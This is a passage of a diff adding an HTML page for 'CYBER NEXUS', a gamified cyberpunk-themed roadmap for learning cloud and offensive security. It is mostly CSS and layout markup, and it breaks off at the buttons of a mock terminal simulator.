@@ -1,0 +1,1856 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<meta name="description" content="Zero to Elite Cloud Security & Offensive Security Operator — Anime Cyberpunk Roadmap"/>
+<title>⚡ CYBER NEXUS — Elite Operator Academy</title>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet"/>
+<style>
+:root{
+  --bg:#040010;--bg2:#080018;--panel:rgba(8,0,24,0.88);
+  --bc:rgba(0,229,255,0.22);--bp:rgba(157,0,255,0.22);--br:rgba(255,0,64,0.22);
+  --cyan:#00e5ff;--purple:#9d00ff;--red:#ff0040;--green:#00ff88;
+  --yellow:#ffd700;--orange:#ff6600;--pink:#ff44cc;
+  --txt:#b8ccd8;--txd:#506070;--txb:#e8f4ff;
+  --gc:0 0 22px rgba(0,229,255,0.4);--gp:0 0 22px rgba(157,0,255,0.4);
+  --gr:0 0 22px rgba(255,0,64,0.4);
+  --ft:'Rajdhani',sans-serif;--fh:'Orbitron',monospace;--fm:'Share Tech Mono',monospace;
+}
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{background:var(--bg);color:var(--txt);font-family:var(--ft);min-height:100vh;overflow-x:hidden;}
+::-webkit-scrollbar{width:5px;height:5px;}
+::-webkit-scrollbar-track{background:var(--bg);}
+::-webkit-scrollbar-thumb{background:var(--cyan);border-radius:3px;}
+
+/* ——— CANVAS + SCANLINES ——— */
+#mx{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;pointer-events:none;opacity:.09;}
+.sl{position:fixed;inset:0;z-index:1;pointer-events:none;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.13) 2px,rgba(0,0,0,.13) 4px);}
+
+/* ——— KANJI ——— */
+.kj{position:fixed;z-index:1;pointer-events:none;font-family:serif;color:rgba(0,229,255,.04);
+  user-select:none;animation:floatK 16s ease-in-out infinite;}
+@keyframes floatK{0%,100%{transform:translateY(0) rotate(0deg);opacity:.04;}50%{transform:translateY(-28px) rotate(4deg);opacity:.08;}}
+
+/* ——— BOOT SCREEN ——— */
+#boot{position:fixed;inset:0;background:#000;z-index:9999;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  font-family:var(--fm);transition:opacity .8s;}
+#boot.out{opacity:0;pointer-events:none;}
+.ba{color:#00ff41;font-size:clamp(7px,1.4vw,13px);text-align:center;margin-bottom:18px;
+  text-shadow:0 0 12px #00ff41;white-space:pre;line-height:1.2;}
+#bl{color:#00ff41;font-size:12px;max-width:580px;width:90%;height:180px;overflow:hidden;
+  text-shadow:0 0 8px #00ff41;}
+.bline{margin-bottom:3px;opacity:0;animation:bla .08s forwards;}
+@keyframes bla{to{opacity:1;}}
+#skp{margin-top:16px;padding:8px 22px;border:1px solid rgba(0,255,65,.4);background:transparent;
+  color:#00ff41;font-family:var(--fm);font-size:11px;cursor:pointer;letter-spacing:2px;transition:all .3s;}
+#skp:hover{background:rgba(0,255,65,.1);box-shadow:0 0 14px rgba(0,255,65,.3);}
+@keyframes blink{0%,49%{opacity:1;}50%,100%{opacity:0;}}
+
+/* ——— APP ——— */
+#app{position:relative;z-index:2;min-height:100vh;opacity:0;transition:opacity .8s;}
+#app.vis{opacity:1;}
+
+/* ——— HEADER ——— */
+.hd{position:sticky;top:0;z-index:100;
+  background:rgba(4,0,10,.97);backdrop-filter:blur(18px);
+  border-bottom:1px solid var(--bc);padding:10px 18px;
+  display:flex;align-items:center;gap:12px;flex-wrap:wrap;
+  box-shadow:0 0 30px rgba(0,229,255,.08);}
+.logo{font-family:var(--fh);font-size:1.05rem;font-weight:900;color:var(--cyan);
+  text-shadow:var(--gc);letter-spacing:3px;white-space:nowrap;}
+.logo s{color:var(--purple);text-shadow:var(--gp);text-decoration:none;}
+.hrk{font-family:var(--fm);font-size:10px;padding:3px 10px;border-radius:3px;
+  border:1px solid var(--cyan);color:var(--cyan);white-space:nowrap;}
+.xpw{flex:1;min-width:110px;max-width:220px;}
+.xpl{font-family:var(--fm);font-size:10px;color:var(--txd);margin-bottom:3px;
+  display:flex;justify-content:space-between;}
+.xpt{height:5px;background:rgba(255,255,255,.07);border-radius:3px;overflow:hidden;}
+.xpf{height:100%;background:linear-gradient(90deg,var(--cyan),var(--purple));
+  border-radius:3px;transition:width .5s;box-shadow:0 0 7px var(--cyan);}
+.hst{display:flex;gap:14px;margin-left:auto;flex-wrap:wrap;}
+.si{font-family:var(--fm);font-size:10px;text-align:center;}
+.sv{display:block;font-size:15px;font-weight:bold;color:var(--cyan);text-shadow:var(--gc);}
+
+/* ——— NAV ——— */
+.nav{display:flex;background:rgba(8,0,24,.95);border-bottom:1px solid var(--bc);
+  overflow-x:auto;position:sticky;top:57px;z-index:99;}
+.nav::-webkit-scrollbar{height:2px;}
+.nb{padding:13px 20px;background:transparent;border:none;color:var(--txd);
+  font-family:var(--fh);font-size:10px;letter-spacing:2px;cursor:pointer;
+  white-space:nowrap;transition:all .3s;border-bottom:2px solid transparent;text-transform:uppercase;
+  position:relative;}
+.nb::after{content:'';position:absolute;bottom:-2px;left:0;right:0;height:2px;
+  background:linear-gradient(90deg,var(--cyan),var(--purple));transform:scaleX(0);transition:transform .3s;}
+.nb:hover{color:var(--cyan);}
+.nb.act{color:var(--cyan);text-shadow:var(--gc);}
+.nb.act::after,.nb:hover::after{transform:scaleX(1);}
+
+/* ——— SECTION ——— */
+.sec{display:none;padding:26px 18px;max-width:1380px;margin:0 auto;animation:fdi .35s ease;}
+.sec.act{display:block;}
+@keyframes fdi{from{opacity:0;transform:translateY(8px);}to{opacity:1;transform:translateY(0);}}
+
+/* ——— TITLES ——— */
+.stit{font-family:var(--fh);font-size:1.5rem;font-weight:900;color:var(--cyan);
+  text-shadow:var(--gc);margin-bottom:6px;text-transform:uppercase;letter-spacing:4px;
+  display:flex;align-items:center;gap:10px;}
+.stit::before{content:'▶';color:var(--purple);text-shadow:var(--gp);font-size:.75em;}
+.ssub{color:var(--txd);font-family:var(--fm);font-size:11px;letter-spacing:2px;margin-bottom:26px;}
+
+/* ——— GLASS ——— */
+.gl{background:var(--panel);border:1px solid var(--bc);border-radius:8px;
+  backdrop-filter:blur(10px);
+  box-shadow:0 0 28px rgba(0,229,255,.04),inset 0 0 28px rgba(0,0,0,.25);
+  transition:box-shadow .3s,border-color .3s;}
+.gl:hover{box-shadow:0 0 38px rgba(0,229,255,.1),inset 0 0 28px rgba(0,0,0,.25);
+  border-color:rgba(0,229,255,.38);}
+
+/* ——— TICKER ——— */
+.tkw{overflow:hidden;border:1px solid var(--bc);border-radius:5px;
+  background:rgba(0,0,0,.5);padding:8px 0;margin-bottom:22px;}
+.tki{display:flex;animation:tka 35s linear infinite;white-space:nowrap;}
+.tkit{font-family:var(--fm);font-size:11px;color:var(--cyan);padding:0 36px;}
+.tkit .tg{color:var(--red);margin-right:6px;}
+@keyframes tka{from{transform:translateX(0);}to{transform:translateX(-50%);}}
+
+/* ——— DASHBOARD ——— */
+.dgr{display:grid;grid-template-columns:repeat(auto-fit,minmax(290px,1fr));gap:18px;margin-bottom:26px;}
+.dc{padding:20px;position:relative;overflow:hidden;}
+.dc::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;
+  background:linear-gradient(90deg,transparent,var(--cyan),transparent);
+  animation:sch 4s linear infinite;}
+@keyframes sch{0%,100%{opacity:.3;}50%{opacity:1;}}
+.dct{font-family:var(--fm);font-size:10px;color:var(--txd);letter-spacing:3px;
+  text-transform:uppercase;margin-bottom:10px;display:flex;align-items:center;gap:7px;}
+.dot{width:6px;height:6px;border-radius:50%;background:var(--cyan);
+  box-shadow:var(--gc);animation:p 2s infinite;}
+@keyframes p{0%,100%{transform:scale(1);}50%{transform:scale(1.35);}}
+.opn{font-family:var(--fh);font-size:1.3rem;font-weight:700;color:var(--txb);margin-bottom:5px;}
+.oprk{font-family:var(--fm);font-size:.85rem;margin-bottom:13px;}
+.skb{margin-top:12px;}
+.skr{display:flex;align-items:center;gap:9px;margin-bottom:8px;}
+.skn{font-family:var(--fm);font-size:10px;color:var(--txd);width:105px;flex-shrink:0;}
+.skt{flex:1;height:4px;background:rgba(255,255,255,.07);border-radius:2px;overflow:hidden;}
+.skbar{height:100%;border-radius:2px;transition:width 1.2s ease;}
+.skpc{font-family:var(--fm);font-size:10px;color:var(--txd);width:30px;text-align:right;}
+
+/* stats row */
+.str{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:13px;margin-bottom:26px;}
+.sc{padding:16px;text-align:center;}
+.scv{font-family:var(--fh);font-size:1.85rem;font-weight:900;display:block;margin-bottom:4px;}
+.scl{font-family:var(--fm);font-size:10px;color:var(--txd);letter-spacing:2px;}
+
+/* mission */
+.mttl{font-family:var(--fh);font-size:.9rem;color:var(--yellow);
+  text-shadow:0 0 14px rgba(255,215,0,.5);margin-bottom:7px;}
+.mdsc{font-size:.88rem;color:var(--txt);margin-bottom:13px;line-height:1.6;}
+.mrw{display:flex;align-items:center;gap:7px;font-family:var(--fm);font-size:11px;color:var(--green);}
+.xbg{background:rgba(0,255,136,.08);border:1px solid rgba(0,255,136,.28);
+  border-radius:3px;padding:2px 9px;color:var(--green);}
+
+/* phase prog */
+.pprow{display:flex;align-items:center;gap:9px;margin-bottom:10px;}
+.ppname{font-family:var(--fm);font-size:10px;width:90px;flex-shrink:0;}
+.ppt{flex:1;height:5px;background:rgba(255,255,255,.07);border-radius:3px;overflow:hidden;}
+.ppb{height:100%;border-radius:3px;transition:width .8s;}
+.pppc{font-family:var(--fm);font-size:10px;color:var(--txd);width:32px;text-align:right;}
+
+/* cyber divider */
+.cdiv{display:flex;align-items:center;gap:13px;margin:26px 0;opacity:.4;}
+.cdiv::before,.cdiv::after{content:'';flex:1;height:1px;
+  background:linear-gradient(90deg,transparent,var(--cyan),transparent);}
+.cdiv span{font-family:var(--fm);font-size:10px;color:var(--cyan);letter-spacing:3px;}
+
+/* intel feed */
+.iitem{border-left:2px solid var(--bc);padding:8px 13px;margin-bottom:10px;
+  font-family:var(--fm);font-size:12px;color:var(--txt);}
+.iitem .itag{color:var(--red);margin-right:8px;}
+
+/* ——— ROADMAP ——— */
+.rctl{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:20px;align-items:center;}
+.si2{flex:1;min-width:190px;max-width:380px;padding:9px 14px;
+  background:rgba(255,255,255,.04);border:1px solid var(--bc);border-radius:5px;
+  color:var(--txt);font-family:var(--fm);font-size:12px;outline:none;transition:all .3s;}
+.si2:focus{border-color:var(--cyan);box-shadow:0 0 14px rgba(0,229,255,.18);}
+.fsel{padding:9px 12px;background:rgba(255,255,255,.04);border:1px solid var(--bc);
+  border-radius:5px;color:var(--txt);font-family:var(--fm);font-size:11px;outline:none;cursor:pointer;}
+.fsel option{background:#050008;}
+
+.pgw{margin-bottom:22px;}
+.pgi{display:flex;justify-content:space-between;font-family:var(--fm);font-size:11px;
+  color:var(--txd);margin-bottom:6px;}
+.pgt{height:9px;background:rgba(255,255,255,.05);border-radius:5px;
+  overflow:hidden;border:1px solid var(--bc);}
+.pgf{height:100%;background:linear-gradient(90deg,var(--cyan),var(--purple),var(--red));
+  border-radius:5px;transition:width .5s;box-shadow:0 0 9px var(--cyan);}
+
+/* phase cards */
+.pc{margin-bottom:14px;border-radius:10px;overflow:hidden;border:1px solid;transition:all .3s;}
+.ph{padding:16px 20px;display:flex;align-items:center;gap:13px;cursor:pointer;
+  user-select:none;position:relative;overflow:hidden;transition:background .2s;}
+.ph:hover{background:rgba(255,255,255,.02);}
+.pnum{font-family:var(--fh);font-size:1.8rem;font-weight:900;opacity:.28;min-width:42px;}
+.pinfo{flex:1;}
+.pname{font-family:var(--fh);font-size:.88rem;font-weight:700;letter-spacing:2px;
+  margin-bottom:3px;text-transform:uppercase;}
+.pmeta{font-family:var(--fm);font-size:10px;color:var(--txd);display:flex;gap:13px;flex-wrap:wrap;}
+.pbadge{padding:3px 10px;border-radius:3px;font-family:var(--fm);font-size:10px;border:1px solid;}
+.parr{font-size:1.1rem;transition:transform .3s;color:var(--txd);}
+.pc.open .parr{transform:rotate(90deg);}
+.pbody{display:none;padding:18px;border-top:1px solid rgba(255,255,255,.05);background:rgba(0,0,0,.28);}
+.pc.open .pbody{display:block;}
+
+/* week */
+.wk{margin-bottom:22px;}
+.wkt{font-family:var(--fh);font-size:.68rem;letter-spacing:3px;color:var(--txd);
+  text-transform:uppercase;margin-bottom:12px;padding-bottom:7px;
+  border-bottom:1px solid rgba(255,255,255,.05);}
+
+/* module card */
+.mc{background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.05);
+  border-radius:7px;padding:15px;margin-bottom:11px;transition:all .3s;position:relative;}
+.mc:hover{border-color:rgba(0,229,255,.18);background:rgba(0,229,255,.02);}
+.mc.done{border-color:rgba(0,255,136,.18);background:rgba(0,255,136,.02);}
+.mc.done .mt{color:var(--green);text-decoration:line-through;opacity:.6;}
+.mtop{display:flex;align-items:center;gap:11px;margin-bottom:12px;}
+.mchk{width:17px;height:17px;cursor:pointer;accent-color:var(--cyan);flex-shrink:0;}
+.mt{font-family:var(--ft);font-size:.98rem;font-weight:600;color:var(--txb);flex:1;}
+.xchip{font-family:var(--fm);font-size:10px;color:var(--yellow);
+  background:rgba(255,215,0,.08);border:1px solid rgba(255,215,0,.24);
+  border-radius:3px;padding:2px 9px;white-space:nowrap;}
+.mcols{display:grid;grid-template-columns:repeat(auto-fit,minmax(175px,1fr));gap:11px;}
+.col{padding:11px;background:rgba(0,0,0,.3);border-radius:6px;border-left:2px solid;}
+.colt{font-family:var(--fm);font-size:9px;letter-spacing:2px;text-transform:uppercase;
+  margin-bottom:7px;font-weight:bold;}
+.coll{list-style:none;padding:0;}
+.coll li{font-size:12px;color:var(--txt);padding:2px 0;font-family:var(--ft);}
+.coll li::before{content:'→ ';opacity:.45;font-size:10px;}
+
+/* ——— ACADEMY ——— */
+.agr{display:grid;grid-template-columns:repeat(auto-fill,minmax(268px,1fr));gap:18px;}
+.plc{padding:20px;border-radius:10px;position:relative;overflow:hidden;
+  transition:all .3s;cursor:default;}
+.plc:hover{transform:translateY(-3px);}
+.plc::before{content:'';position:absolute;inset:0;
+  background:linear-gradient(135deg,rgba(255,255,255,.025) 0%,transparent 60%);pointer-events:none;}
+.plico{font-size:1.9rem;margin-bottom:9px;display:block;}
+.plnm{font-family:var(--fh);font-size:.78rem;font-weight:700;letter-spacing:2px;
+  margin-bottom:5px;text-transform:uppercase;}
+.plds{font-size:.82rem;color:var(--txd);line-height:1.5;margin-bottom:11px;}
+.ptags{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:10px;}
+.tag{padding:2px 7px;border-radius:3px;font-family:var(--fm);font-size:9px;border:1px solid;}
+.toff{color:var(--red);border-color:rgba(255,0,64,.3);background:rgba(255,0,64,.05);}
+.tdef{color:var(--cyan);border-color:rgba(0,229,255,.3);background:rgba(0,229,255,.05);}
+.tcld{color:var(--purple);border-color:rgba(157,0,255,.3);background:rgba(157,0,255,.05);}
+.tweb{color:var(--yellow);border-color:rgba(255,215,0,.3);background:rgba(255,215,0,.05);}
+.tctf{color:var(--green);border-color:rgba(0,255,136,.3);background:rgba(0,255,136,.05);}
+.tlin{color:var(--orange);border-color:rgba(255,102,0,.3);background:rgba(255,102,0,.05);}
+.plft{display:flex;justify-content:space-between;align-items:center;margin-top:10px;}
+.pllv{font-family:var(--fm);font-size:10px;color:var(--txd);}
+.pla{font-family:var(--fm);font-size:10px;color:var(--cyan);text-decoration:none;
+  border:1px solid var(--bc);padding:3px 11px;border-radius:3px;transition:all .3s;}
+.pla:hover{background:rgba(0,229,255,.1);box-shadow:var(--gc);}
+
+/* ——— CERTS ——— */
+.cgr{display:grid;grid-template-columns:repeat(auto-fill,minmax(310px,1fr));gap:18px;}
+.cc{padding:22px;border-radius:10px;position:relative;overflow:hidden;}
+.cchd{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:12px;}
+.ccnm{font-family:var(--fh);font-size:.92rem;font-weight:900;letter-spacing:2px;
+  text-transform:uppercase;flex:1;}
+.ccbg{font-family:var(--fm);font-size:9px;padding:3px 9px;border-radius:3px;
+  border:1px solid;margin-left:9px;white-space:nowrap;}
+.ccbd{font-size:.82rem;color:var(--txd);margin-bottom:12px;line-height:1.6;}
+.ccir{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px;}
+.ccii{font-family:var(--fm);font-size:10px;color:var(--txd);
+  background:rgba(255,255,255,.04);padding:3px 9px;border-radius:3px;
+  border:1px solid rgba(255,255,255,.07);}
+.ccdoms{margin-top:10px;}
+.ccdt{font-family:var(--fm);font-size:9px;color:var(--txd);letter-spacing:2px;margin-bottom:6px;}
+.ccdl{list-style:none;padding:0;}
+.ccdl li{font-size:11px;color:var(--txt);padding:2px 0;font-family:var(--fm);}
+.ccdl li::before{content:'◦ ';color:var(--txd);}
+
+/* ——— TERMINAL ——— */
+.tw{background:#000;border:1px solid rgba(0,255,65,.28);border-radius:8px;overflow:hidden;
+  box-shadow:0 0 36px rgba(0,255,65,.08);max-width:880px;margin:0 auto;}
+.ttb{background:rgba(0,255,65,.08);border-bottom:1px solid rgba(0,255,65,.17);
+  padding:9px 14px;display:flex;align-items:center;gap:9px;font-family:var(--fm);
+  font-size:11px;color:rgba(0,255,65,.6);}
+.tdo{width:11px;height:11px;border-radius:50%;}
+.tsc{padding:18px;min-height:380px;max-height:460px;overflow-y:auto;
+  font-family:var(--fm);font-size:12px;color:#00ff41;line-height:1.6;}
+.tsc::-webkit-scrollbar{width:3px;}
+.tsc::-webkit-scrollbar-thumb{background:rgba(0,255,65,.3);}
+.tl{margin-bottom:1px;}
+.tl.cmd{color:#fff;}.tl.out{color:#00ff41;}.tl.err{color:#ff4444;}
+.tl.inf{color:#00aaff;}.tl.war{color:#ffaa00;}
+.tir{display:flex;align-items:center;gap:7px;padding:10px 18px;
+  border-top:1px solid rgba(0,255,65,.13);background:rgba(0,255,65,.02);}
+.tpr{color:#00ff41;font-family:var(--fm);font-size:12px;white-space:nowrap;}
+.tin{flex:1;background:transparent;border:none;outline:none;color:#fff;
+  font-family:var(--fm);font-size:12px;caret-color:#00ff41;}
+.tbts{margin-top:16px;display:flex;gap:8px;flex-wrap:wrap;}
+.btn{padding:8px 18px;background:transparent;border:1px solid var(--bc);border-radius:5px;
+  color:var(--cyan);font-family:var(--fm);font-size:11px;cursor:pointer;letter-spacing:2px;
+  transition:all .3s;text-transform:uppercase;}
+.btn:hover{background:rgba(0,229,255,.08);box-shadow:var(--gc);}
+.btn.dr{border-color:var(--br);color:var(--red);}
+.btn.dr:hover{background:rgba(255,0,64,.08);box-shadow:var(--gr);}
+
+/* ——— ACHIEVEMENTS ——— */
+.achgr{display:grid;grid-template-columns:repeat(auto-fill,minmax(190px,1fr));gap:13px;}
+.ach{padding:16px;border-radius:8px;text-align:center;transition:all .3s;}
+.ach.lk{opacity:.3;filter:grayscale(1);}
+.achi{font-size:2.2rem;margin-bottom:9px;display:block;}
+.achn{font-family:var(--fh);font-size:.65rem;letter-spacing:2px;text-transform:uppercase;
+  margin-bottom:4px;color:var(--txb);}
+.achd{font-family:var(--fm);font-size:10px;color:var(--txd);line-height:1.4;}
+.achx{margin-top:7px;font-family:var(--fm);font-size:10px;color:var(--yellow);}
+
+/* ——— TOAST ——— */
+#tc{position:fixed;top:75px;right:18px;z-index:8900;
+  display:flex;flex-direction:column;gap:9px;max-width:300px;}
+.toast{background:rgba(0,10,20,.97);border:1px solid var(--cyan);border-radius:7px;
+  padding:12px 16px;font-family:var(--fm);font-size:11px;color:var(--txb);
+  box-shadow:0 0 22px rgba(0,229,255,.28);
+  animation:ti .4s ease,to .4s ease 3s forwards;
+  display:flex;align-items:center;gap:9px;backdrop-filter:blur(18px);}
+@keyframes ti{from{transform:translateX(90px);opacity:0;}to{transform:translateX(0);opacity:1;}}
+@keyframes to{to{transform:translateX(110px);opacity:0;}}
+.ti2{font-size:1.3rem;}
+.tttl{color:var(--cyan);font-weight:bold;margin-bottom:2px;text-transform:uppercase;letter-spacing:1px;}
+.tbd{color:var(--txd);font-size:10px;}
+
+/* ——— RANK UP ——— */
+#ruf{position:fixed;inset:0;z-index:8000;pointer-events:none;
+  display:flex;align-items:center;justify-content:center;opacity:0;}
+#ruf.act{animation:rua 2.2s ease forwards;}
+@keyframes rua{0%{opacity:0;}10%{opacity:1;background:rgba(157,0,255,.12);}80%{opacity:1;}100%{opacity:0;}}
+.rut{font-family:var(--fh);font-size:clamp(1.4rem,5vw,3.5rem);font-weight:900;
+  color:var(--yellow);text-shadow:0 0 36px var(--yellow),0 0 72px var(--yellow);
+  text-align:center;animation:gt .5s steps(3) infinite;}
+@keyframes gt{0%{text-shadow:0 0 36px var(--yellow);}33%{text-shadow:-3px 0 var(--red),3px 0 var(--cyan),0 0 36px var(--yellow);}66%{text-shadow:3px 0 var(--red),-3px 0 var(--cyan),0 0 36px var(--yellow);}100%{text-shadow:0 0 36px var(--yellow);}}
+
+/* ——— GLITCH ——— */
+.glitch{position:relative;display:inline-block;}
+.glitch::before,.glitch::after{content:attr(data-text);position:absolute;top:0;left:0;width:100%;height:100%;}
+.glitch::before{color:var(--cyan);clip-path:polygon(0 30%,100% 30%,100% 50%,0 50%);animation:g1 5s infinite;}
+.glitch::after{color:var(--red);clip-path:polygon(0 65%,100% 65%,100% 78%,0 78%);animation:g2 5s infinite;}
+@keyframes g1{0%,88%,100%{transform:translate(0);}90%{transform:translate(-3px,0);}93%{transform:translate(3px,0);}96%{transform:translate(-2px,0);}}
+@keyframes g2{0%,88%,100%{transform:translate(0);}90%{transform:translate(3px,0);}93%{transform:translate(-3px,0);}96%{transform:translate(2px,0);}}
+
+/* ——— RESPONSIVE ——— */
+@media(max-width:768px){
+  .hd{padding:9px 12px;gap:9px;}.logo{font-size:.88rem;}.hst{display:none;}
+  .sec{padding:18px 11px;}.stit{font-size:1.15rem;letter-spacing:2px;}
+  .nb{padding:11px 13px;font-size:9px;letter-spacing:1px;}
+  .mcols{grid-template-columns:1fr;}.dgr{grid-template-columns:1fr;}
+  .agr{grid-template-columns:1fr;}.cgr{grid-template-columns:1fr;}
+  .ba{font-size:6px;}
+}
+</style>
+</head>
+<body>
+
+<!-- KANJI BACKGROUND -->
+<div class="kj" style="top:8%;left:4%;font-size:70px;">侵</div>
+<div class="kj" style="top:28%;right:6%;animation-delay:-5s;font-size:85px;">攻</div>
+<div class="kj" style="bottom:18%;left:13%;animation-delay:-10s;font-size:52px;">防</div>
+<div class="kj" style="bottom:42%;right:18%;animation-delay:-7s;font-size:72px;">零</div>
+<div class="kj" style="top:55%;left:50%;animation-delay:-3s;font-size:60px;">駆</div>
+
+<!-- BOOT SCREEN -->
+<div id="boot">
+<pre class="ba">
+  ██████╗██╗   ██╗██████╗ ███████╗██████╗     ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗
+ ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗    ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝
+ ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝    ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗
+ ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗    ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║
+ ╚██████╗   ██║   ██████╔╝███████╗██║  ██║    ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║
+  ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
+</pre>
+<div id="bl"></div>
+<button id="skp" onclick="skipBoot()">[ SKIP → LAUNCH ]</button>
+</div>
+
+<!-- MATRIX CANVAS -->
+<canvas id="mx"></canvas>
+<div class="sl"></div>
+
+<!-- TOAST CONTAINER -->
+<div id="tc"></div>
+<!-- RANK UP FLASH -->
+<div id="ruf"><div class="rut" id="rutxt">⚡ RANK UP!</div></div>
+
+<!-- MAIN APP -->
+<div id="app">
+  <!-- HEADER -->
+  <header class="hd">
+    <div class="logo">CYBER<s>NEXUS</s></div>
+    <div class="hrk" id="hrkEl">■ SCRIPT KIDDIE</div>
+    <div class="xpw">
+      <div class="xpl"><span>XP: <span id="xpDsp">0</span></span><span>LVL <span id="lvlDsp">1</span></span></div>
+      <div class="xpt"><div class="xpf" id="xpFill" style="width:0%"></div></div>
+    </div>
+    <div class="hst">
+      <div class="si"><span class="sv" id="stCmp">0</span><span>Done</span></div>
+      <div class="si"><span class="sv" id="stStrk">0</span><span>Streak</span></div>
+      <div class="si" style="color:var(--txd);font-family:var(--fm);font-size:10px;"><span id="opid">CN#0000</span></div>
+    </div>
+  </header>
+
+  <!-- NAV -->
+  <nav class="nav">
+    <button class="nb act" onclick="showSec('home',this)">⚡ HOME</button>
+    <button class="nb" onclick="showSec('roadmap',this)">🗺 ROADMAP</button>
+    <button class="nb" onclick="showSec('academy',this)">🎓 ACADEMY</button>
+    <button class="nb" onclick="showSec('certs',this)">🏆 CERTS</button>
+    <button class="nb" onclick="showSec('terminal',this)">💻 TERMINAL</button>
+    <button class="nb" onclick="showSec('achievements',this)">🎖 BADGES</button>
+  </nav>
+
+  <!-- ===== HOME ===== -->
+  <section class="sec act" id="sec-home">
+    <div class="tkw"><div class="tki" id="tkInner"></div></div>
+    <h1 class="stit glitch" data-text="OPERATOR DASHBOARD">OPERATOR DASHBOARD</h1>
+    <p class="ssub">// SYSTEM ONLINE • THREAT LEVEL: CRITICAL • MISSION: ACTIVE • STAY IN THE SHADOWS</p>
+    <div class="str" id="statsRow"></div>
+    <div class="dgr">
+      <div class="gl dc" id="opCard">
+        <div class="dct"><span class="dot"></span>OPERATOR PROFILE</div>
+        <div class="opn" id="opName">SHADOW_OPS</div>
+        <div class="oprk" id="opRkBig" style="color:var(--cyan);">◈ Script Kiddie</div>
+        <div class="skb" id="skillBars"></div>
+      </div>
+      <div class="gl dc">
+        <div class="dct"><span class="dot" style="background:var(--yellow);box-shadow:0 0 7px var(--yellow);animation-duration:1.4s;"></span>ACTIVE MISSION</div>
+        <div id="dailyMission"></div>
+      </div>
+      <div class="gl dc">
+        <div class="dct"><span class="dot" style="background:var(--green);box-shadow:0 0 7px var(--green);"></span>CAMPAIGN PROGRESS</div>
+        <div id="phProgOv" style="margin-top:4px;"></div>
+      </div>
+    </div>
+    <div class="cdiv"><span>INTEL FEED</span></div>
+    <div class="gl" style="padding:20px;" id="intelFeed">
+      <div class="dct"><span class="dot" style="background:var(--purple);box-shadow:0 0 7px var(--purple);"></span>LIVE CYBER INTEL</div>
+      <div id="intelItems"></div>
+    </div>
+  </section>
+
+  <!-- ===== ROADMAP ===== -->
+  <section class="sec" id="sec-roadmap">
+    <h1 class="stit glitch" data-text="MISSION ROADMAP">MISSION ROADMAP</h1>
+    <p class="ssub">// ZERO → ELITE OPERATOR • 7 PHASES • 40+ MODULES • 3 HOURS/DAY</p>
+    <div class="rctl">
+      <input class="si2" id="srch" placeholder="⌕  Search missions, topics, tools, labs..." oninput="renderRoadmap()"/>
+      <select class="fsel" id="dfil" onchange="renderRoadmap()">
+        <option value="all">All Phases</option>
+        <option value="Beginner">Beginner</option>
+        <option value="Intermediate">Intermediate</option>
+        <option value="Advanced">Advanced</option>
+        <option value="Expert">Expert</option>
+      </select>
+    </div>
+    <div class="pgw">
+      <div class="pgi"><span id="pgTxt">0 / 0 missions</span><span id="pgPct">0%</span></div>
+      <div class="pgt"><div class="pgf" id="pgFill" style="width:0%"></div></div>
+    </div>
+    <div id="rmCont"></div>
+  </section>
+
+  <!-- ===== ACADEMY ===== -->
+  <section class="sec" id="sec-academy">
+    <h1 class="stit glitch" data-text="CYBER ACADEMY">CYBER ACADEMY</h1>
+    <p class="ssub">// FREE ELITE PLATFORMS • 20+ RESOURCES • ORDERED BY LEARNING SEQUENCE</p>
+    <div class="agr" id="acadGrid"></div>
+  </section>
+
+  <!-- ===== CERTS ===== -->
+  <section class="sec" id="sec-certs">
+    <h1 class="stit glitch" data-text="CERTIFICATION PATHS">CERTIFICATION PATHS</h1>
+    <p class="ssub">// INDUSTRY-RECOGNIZED CREDENTIALS • RANKED BY DIFFICULTY • CAREER DEFINING</p>
+    <div class="cgr" id="certGrid"></div>
+  </section>
+
+  <!-- ===== TERMINAL ===== -->
+  <section class="sec" id="sec-terminal">
+    <h1 class="stit" style="color:var(--green);text-shadow:0 0 18px rgba(0,255,136,.4);">CYBER TERMINAL</h1>
+    <p class="ssub">// INTERACTIVE HACKING SIMULATOR • TYPE 'help' FOR COMMAND LIST</p>
+    <div class="tw">
+      <div class="ttb">
+        <span class="tdo" style="background:#ff5f56;"></span>
+        <span class="tdo" style="background:#ffbd2e;"></span>
+        <span class="tdo" style="background:#27c93f;"></span>
+        <span style="margin-left:auto;">CYBER NEXUS // SECURE SHELL v3.7.1 // ENCRYPTED</span>
+      </div>
+      <div class="tsc" id="tScr"></div>
+      <div class="tir">
+        <span class="tpr" id="tPrm">operator@nexus:~$</span>
+        <input class="tin" id="tIn" autocomplete="off" spellcheck="false" placeholder="enter command..."/>
+      </div>
+    </div>
+    <div class="tbts">
+      <button class="btn" onclick="termCmd('help')">help</button>
+      <button class="btn" onclick="termCmd('whoami')">whoami</button>
+      <button class="btn" onclick="termCmd('status')">status</button>
